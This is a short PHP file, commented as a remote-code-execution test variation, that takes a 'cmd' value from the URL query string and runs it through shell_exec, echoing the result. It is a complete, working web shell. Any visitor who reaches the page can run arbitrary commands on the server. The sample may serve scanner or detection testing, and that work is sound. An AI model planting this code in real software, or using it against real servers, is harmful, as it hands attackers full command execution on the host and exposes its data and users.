<?php
// RCE test variation #1270
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>